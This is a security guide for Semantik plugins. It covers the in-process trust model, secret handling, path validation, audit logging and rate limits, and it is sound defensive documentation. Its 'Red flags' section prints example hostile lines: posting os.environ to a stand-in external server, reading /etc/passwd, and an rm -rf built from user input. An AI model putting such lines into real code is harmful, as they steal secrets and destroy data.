# Security Guide

Security model, trust considerations, and best practices for Semantik plugins.

## Security Model Overview

### Trust Model

Semantik plugins use a **trusted plugin model**:

- **Plugins run in-process** with the main Semantik application
- **No sandboxing or isolation** - plugins have full access to the Python runtime
- **Only install plugins you trust** - from verified sources or that you've audited

### What Plugins Can Access

When you install a plugin, it has access to:

| Resource | Access Level |
|----------|--------------|
| Environment variables | Full (including secrets) |
| Filesystem | Full read/write within container |
| Network | Unrestricted |
| Database | Via available connections |
| GPU/Memory | Shared with application |

### Why This Model?

Semantik is designed for **experimentation** by trusted developers (primarily yourself). Full sandboxing would require:

1. Out-of-process execution (subprocess, WASM, containers)
2. Complex IPC for plugin communication
3. Significant performance overhead
4. Limited plugin capabilities

For the target use case (self-hosted semantic search with self-authored plugins), the complexity isn't justified.

---

## For Users

### Best Practices

1. **Only install trusted plugins**
   - From sources you've audited
   - From your own development
   - From verified authors you trust

2. **Review plugin source code** before installation
   - Check for suspicious network calls
   - Look for environment variable access
   - Verify no data exfiltration

3. **Use minimal permissions**
   - Run Semantik in containers with limited privileges
   - Don't mount sensitive host directories
   - Use secrets management, not env vars when possible

4. **Monitor plugin activity**
   - Review logs regularly
   - Watch for unexpected network traffic
   - Monitor resource usage

### What to Look For in Code Review

**Red flags:**
```python
# Suspicious: Sending data to unknown endpoints
requests.post("https://unknown-server.com/collect", data=os.environ)

# Suspicious: Reading arbitrary files
with open("/etc/passwd") as f:
    content = f.read()

# Suspicious: Executing shell commands with user input
os.system(f"rm -rf {user_input}")
```

**Acceptable patterns:**
```python
# OK: Using configured API endpoint
response = await self._client.post(self._config["api_url"], json=payload)

# OK: Reading files within expected directories
doc_path = self._config["docs_dir"] / filename
with open(doc_path) as f:
    content = f.read()

# OK: Using environment variables for secrets
api_key = os.environ.get(self._config["api_key_env"])
```

---

## For Plugin Authors

### 1. Never Log Sensitive Configuration

```python
# BAD: Logging API key
logger.info("Config: %s", self._config)
logger.debug("Using API key: %s", self._config.get("api_key"))

# GOOD: Log only non-sensitive information
logger.info("Configured with keys: %s", list(self._config.keys()))
logger.debug("Using model: %s", self._config.get("model"))
```

### 2. Use Environment Variable References

Instead of accepting raw secrets, use the `_env` suffix pattern:

```python
@classmethod
def get_config_fields(cls) -> list[dict[str, Any]]:
    return [
        {
            "name": "api_key_env",  # Reference, not the actual key
            "type": "text",
            "label": "API Key Environment Variable",
            "description": "Name of env var containing API key",
            "placeholder": "MY_API_KEY",
        },
    ]

# At runtime, Semantik resolves it:
# User sets: api_key_env = "MY_API_KEY"
# Plugin receives: api_key = "<actual key from MY_API_KEY>"
```

### 3. Request Only Necessary Configuration

```python
# BAD: Asking for everything
@classmethod
def get_config_fields(cls) -> list[dict[str, Any]]:
    return [
        {"name": "api_key", "type": "password", ...},
        {"name": "admin_password", "type": "password", ...},  # Why?
        {"name": "database_url", "type": "text", ...},  # Not needed
        {"name": "ssh_key", "type": "password", ...},  # Suspicious
    ]

# GOOD: Only what's needed
@classmethod
def get_config_fields(cls) -> list[dict[str, Any]]:
    return [
        {"name": "api_key_env", "type": "text", "label": "API Key Env Var", ...},
        {"name": "model", "type": "select", "options": ["model-a", "model-b"], ...},
    ]
```

### 4. Handle Errors Gracefully

```python
# BAD: Exposing internal details
try:
    response = await self._client.post(url, headers={"Authorization": f"Bearer {api_key}"})
except Exception as e:
    raise PluginError(f"Request failed with key {api_key[:10]}...: {e}")  # Leaks key!

# GOOD: Safe error handling
try:
    response = await self._client.post(url, headers={"Authorization": f"Bearer {api_key}"})
except Exception as e:
    logger.error("API request failed", exc_info=True)  # Full traceback in logs only
    raise PluginError("API request failed. Check logs for details.")
```

### 5. Validate Input Data

```python
# BAD: Trusting user input
async def load_documents(self, source_id: int | None = None):
    path = self._config.get("path")
    for file in os.listdir(path):  # No validation
        yield await self._read_file(os.path.join(path, file))

# GOOD: Validate paths
import os.path

async def load_documents(self, source_id: int | None = None):
    base_path = os.path.abspath(self._config.get("path", "."))

    for file in os.listdir(base_path):
        file_path = os.path.abspath(os.path.join(base_path, file))

        # Prevent path traversal
        if not file_path.startswith(base_path):
            logger.warning("Skipping file outside base path: %s", file)
            continue

        yield await self._read_file(file_path)
```

### 6. Use Timeouts for External Calls

```python
# BAD: No timeout (can hang forever)
response = await self._client.post(url, json=data)

# GOOD: Always use timeouts
import aiohttp

async with aiohttp.ClientSession(
    timeout=aiohttp.ClientTimeout(total=30)
) as session:
    async with session.post(url, json=data) as response:
        return await response.json()
```

---

## Environment Variable Protection

### The `_env` Suffix Pattern

Semantik uses a cooperative pattern for secret management:

```python
# User stores in config (database):
{
    "api_key_env": "OPENAI_API_KEY",  # Reference to env var
    "model": "gpt-4"
}

# At runtime, Semantik resolves env vars:
{
    "api_key": "sk-actual-key-value",  # Resolved from OPENAI_API_KEY
    "model": "gpt-4"
}
```

This keeps raw secrets out of the database while making them available at runtime.

### Filtered Patterns

When using cooperative filtering utilities, these patterns in environment variable names are typically filtered:

- `PASSWORD`
- `SECRET`
- `KEY`
- `TOKEN`
- `CREDENTIAL`
- `API_KEY`
- `PRIVATE`
- `AUTH`

### Limitations

This is **cooperative only**. A malicious plugin can still access `os.environ` directly. The pattern exists for plugins that want to avoid accidentally logging or exposing secrets.

---

## Audit Logging

Semantik logs plugin operations for security auditing.

### Logged Events

| Event | Description |
|-------|-------------|
| `plugin.registered.builtin` | Built-in plugin loaded |
| `plugin.registered.external` | External plugin loaded |
| `plugin.load.failed` | Plugin failed to load |
| `plugin.config.updated` | Plugin configuration changed |
| `plugin.enabled` | Plugin enabled |
| `plugin.disabled` | Plugin disabled |
| `plugin.health_check` | Health check performed |

### Log Format

Plugin audit logs use structured logging:

```
PLUGIN_AUDIT: my-embedding-plugin - plugin.registered.external
```

### Viewing Audit Logs

```bash
# Docker logs
docker logs semantik-webui 2>&1 | grep PLUGIN_AUDIT

# Filter by action
docker logs semantik-webui 2>&1 | grep "plugin.registered"
```

---

## API Rate Limiting

Plugin API endpoints are rate-limited to prevent abuse:

| Endpoint | Default Limit |
|----------|---------------|
| `POST /api/v2/plugins/install` | 2/minute |
| `DELETE /api/v2/plugins/{id}/uninstall` | 5/minute |
| `GET /api/v2/plugins/{id}/health` | 30/minute |
| `GET /api/v2/plugins` | 60/minute |

Rate limits can be configured via environment variables:

```bash
PLUGIN_INSTALL_RATE_LIMIT=5
PLUGIN_HEALTH_RATE_LIMIT=100
```

---

## Security Checklist for Plugin Authors

Before publishing your plugin:

- [ ] No hardcoded secrets or API keys
- [ ] Uses `_env` suffix pattern for secrets
- [ ] No logging of sensitive configuration values
- [ ] All external calls have timeouts
- [ ] Input paths are validated (no path traversal)
- [ ] Error messages don't leak sensitive information
- [ ] Only requests necessary configuration fields
- [ ] README documents what access the plugin needs
- [ ] Source code is publicly available for audit

---

## Future Roadmap

The following security features are deferred until untrusted third-party plugins become a concern:

- **Plugin sandboxing** - Out-of-process execution with resource limits
- **Permission system** - Declared permissions with user consent
- **Plugin verification** - Code signing and security scanning
- **Tiered trust model** - Different isolation levels based on trust

---

## Questions?

If you have security concerns or need guidance:

1. Review the [Semantik plugin documentation](https://github.com/jbmiller10/semantik/blob/main/docs/PLUGIN_SECURITY.md)
2. Open a GitHub issue for security discussions
3. For vulnerabilities, contact maintainers directly
